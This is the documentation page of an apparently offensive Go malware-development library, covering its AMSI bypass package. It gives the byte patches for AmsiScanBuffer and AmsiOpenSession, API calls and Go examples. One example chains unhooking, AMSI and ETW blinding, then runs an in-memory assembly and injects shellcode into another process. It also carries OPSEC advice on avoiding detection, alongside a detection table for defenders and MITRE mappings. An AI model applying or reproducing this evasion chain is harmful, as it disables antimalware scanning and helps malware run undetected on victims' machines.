---
package: github.com/oioio-space/maldev/evasion/amsi
last_reviewed: 2026-05-04
reflects_commit: 3de532d
---

# AMSI bypass

[← evasion index](README.md) · [docs/index](../../index.md)

## TL;DR

Patch `AmsiScanBuffer` (3-byte `xor eax,eax; ret` prologue) and/or
`AmsiOpenSession` (flip the conditional jump) in the loaded `amsi.dll`
of the current process. Result: every AMSI scan returns "clean" without
ever reaching the registered antimalware provider.

## Primer

The Antimalware Scan Interface is the Windows mechanism that ships
script bodies (PowerShell, .NET, VBScript, JScript) to a registered
antimalware provider — usually Defender — for inspection before
execution. Loaders that decrypt-and-run a payload in a managed runtime
(`Assembly.Load`, `IEX`) trigger AMSI; if Defender flags the body, the
runtime aborts.

The bypass operates at the per-process level by patching `amsi.dll` in
the current process's address space. AMSI's interface is COM, but the
critical path goes through two functions in the DLL:

- `AmsiScanBuffer(amsiContext, buffer, length, contentName, amsiSession,
  result) → HRESULT` — submits content for scanning, writes verdict to
  `*result`.
- `AmsiOpenSession(amsiContext, amsiSession) → HRESULT` — initialises a
  scan session; null session means no scanning.

Patching either short-circuits the chain.

> [!IMPORTANT]
> AMSI patches are **per-process**. They don't disable AMSI system-wide —
> Defender keeps scanning every other process normally. The patch
> survives only as long as `amsi.dll` is mapped in the current process.

## How it works

```mermaid
sequenceDiagram
    participant Loader as "runtime/clr or PowerShell host"
    participant amsi as "amsi.dll"
    participant Provider as "Defender (MpOav.dll)"

    rect rgb(255,238,238)
        Note over Loader,Provider: Without patch
        Loader->>amsi: AmsiScanBuffer(payload)
        amsi->>Provider: ScanContent
        Provider-->>amsi: AMSI_RESULT_DETECTED
        amsi-->>Loader: HRESULT, *result = DETECTED
        Loader->>Loader: abort
    end

    rect rgb(238,255,238)
        Note over Loader,Provider: After PatchScanBuffer
        Loader->>amsi: AmsiScanBuffer(payload)
        Note over amsi: prologue is now<br>31 C0 C3 (xor eax,eax; ret)
        amsi-->>Loader: returns S_OK, *result untouched
        Loader->>Loader: continue (treats as clean)
    end
```

`PatchScanBuffer` does:

1. `LoadLibraryW("amsi.dll")` to ensure the module is mapped (no-op if
   already loaded).
2. `GetProcAddress(amsi, "AmsiScanBuffer")` — function entry.
3. `NtProtectVirtualMemory(addr, 3, PAGE_EXECUTE_READWRITE)` via the
   supplied `*Caller`.
4. memcpy `31 C0 C3` over the prologue.
5. `NtProtectVirtualMemory(addr, 3, original)` to restore.

`PatchOpenSession` is similar but flips a single byte in the prologue
of `AmsiOpenSession` (`JZ → JNZ`), making session creation always
"succeed" without initialising the provider.

## API Reference

### `PatchScanBuffer(caller *wsyscall.Caller) error`

[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/evasion/amsi#PatchScanBuffer)

Overwrite the `AmsiScanBuffer` prologue with `xor eax,eax; ret`.

**Parameters:** `caller` — optional `*wsyscall.Caller`. `nil` falls back
to WinAPI for debug; pass an indirect-syscall caller in production.

**Returns:** `error` — wraps `LoadLibraryW` / `GetProcAddress` /
`NtProtectVirtualMemory` failures. `nil` if `amsi.dll` is not loaded
and cannot be loaded (skipped silently).

**Side effects:** the running process's `amsi.dll` `.text` section is
patched (3 bytes). Persists for the process lifetime.

**OPSEC:** the `NtProtectVirtualMemory(amsi.dll, RWX)` is the loudest
event — visible in ETW Threat Intelligence (`EVENT_TI_NTPROTECT`).

**Required privileges:** unprivileged (own-process memory only).

### `PatchOpenSession(caller *wsyscall.Caller) error`

Flip the conditional jump in `AmsiOpenSession` so session creation
always returns success without the provider initialising.

**Required privileges:** unprivileged (own-process memory only).

### `PatchAll(caller *wsyscall.Caller) error`

Apply both `PatchScanBuffer` and `PatchOpenSession`. Idempotent — safe
to call multiple times.

**Required privileges:** unprivileged (own-process memory only).

### `ScanBufferPatch() evasion.Technique`, `OpenSessionPatch() evasion.Technique`, `All() evasion.Technique`

Adapt the patches to the `evasion.Technique` interface for composition
with `evasion.ApplyAll`.

**Required privileges:** unprivileged (own-process memory only when
applied via `evasion.ApplyAll`).

## Examples

### Simple

```go
caller := wsyscall.New(wsyscall.MethodIndirect, nil)
if err := amsi.PatchScanBuffer(caller); err != nil {
    log.Fatal(err)
}
// AmsiScanBuffer now returns clean for everything in this process.
```

### Composed (with `evasion.ApplyAll`)

```go
caller := wsyscall.New(wsyscall.MethodIndirect, nil)
results := evasion.ApplyAll([]evasion.Technique{
    amsi.All(),  // patches both scan + session
    etw.All(),   // blinds ETW too
}, caller)
for name, err := range results {
    if err != nil {
        log.Printf("%s: %v", name, err)
    }
}
```

### Advanced (full pre-injection chain)

```go
caller := wsyscall.New(wsyscall.MethodIndirect, nil)
techniques := []evasion.Technique{}
techniques = append(techniques, unhook.CommonClassic()...) // restore ntdll first
techniques = append(techniques, amsi.All(), etw.All())     // then blind
_ = evasion.ApplyAll(techniques, caller)

// Everything below now runs without AMSI / ETW visibility:
clr.LoadAndExecute(assembly)
inject.SectionMapInject(targetPID, shellcode, caller, nil)
```

## OPSEC & Detection

| Artefact | Where defenders look |
|---|---|
| `NtProtectVirtualMemory(amsi.dll, RWX)` | ETW TI `EVENT_TI_NTPROTECT` — **single highest-leverage signal** |
| 3 bytes of `amsi.dll` differ from on-disk image | EDR memory-integrity scan of loaded modules |
| `AmsiScanBuffer` returning S_OK in 0 µs | Statistical hunt — real scans take 100 µs–10 ms |
| Process loaded `amsi.dll` but never calls back to provider | ETW provider event volume per process |

**D3FEND counters:** [D3-PMC](https://d3fend.mitre.org/technique/d3f:ProcessModuleCodeManipulation/),
[D3-PSA](https://d3fend.mitre.org/technique/d3f:ProcessSpawnAnalysis/).

**Hardening:** AMSI Provider DLL pinned + signed; on Win11, CFG +
ProcessUserShadowStackPolicy increase the cost of reaching the patch
site reliably.

## MITRE ATT&CK

| T-ID | Name | Sub-coverage | D3FEND counter |
|---|---|---|---|
| [T1562.001](https://attack.mitre.org/techniques/T1562/001/) | Impair Defenses: Disable or Modify Tools | full (per-process AMSI nullification) | D3-PMC, D3-PSA |

## Limitations

- **Per-process only.** Doesn't affect AMSI scans from other processes
  (so a child PowerShell still gets scanned unless that child also
  patches).
- **Defender def-update can flag the byte pattern.** Modern Defender
  flags the loaded-process side-effect (Windows-AMSI-Bypass detections).
  Composing with `unhook` first reduces the chance of being mid-flight
  when Defender's hooks fire.
- **CFG (Control Flow Guard)** doesn't block prologue patches but EDR
  hook scanners that rescan `amsi.dll` periodically will catch it.
- **AMSI providers other than Defender** (e.g., third-party AV) might
  use different code paths that don't go through `AmsiScanBuffer` —
  rare today but worth knowing.
- **`PatchOpenSession` is idempotent within a process.** It scans the
  first 1024 bytes of `AmsiOpenSession` for a `0x74` (JZ) and flips the
  first match to `0x75` (JNZ). A package-level atomic flag short-circuits
  subsequent calls so re-invoking the patch (e.g. once per syscall caller
  in a sweep) doesn't consume additional `0x74` sites and surface a
  spurious "conditional jump (0x74) not found" error. `PatchScanBuffer`
  is naturally idempotent — it always writes the same 3 bytes at the
  function entry.

## See also

- [`evasion/etw`](etw-patching.md) — sibling defence-impair.
- [`evasion/unhook`](ntdll-unhooking.md) — restore EDR-hooked APIs first.
- [Rasta Mouse — Memory Patching AMSI Bypass](https://rastamouse.me/2018/10/amsiscanbufferantimalwarescanbuffer-bypass/) — original reference.
- [Microsoft — AMSI overview](https://learn.microsoft.com/windows/win32/amsi/how-amsi-helps).
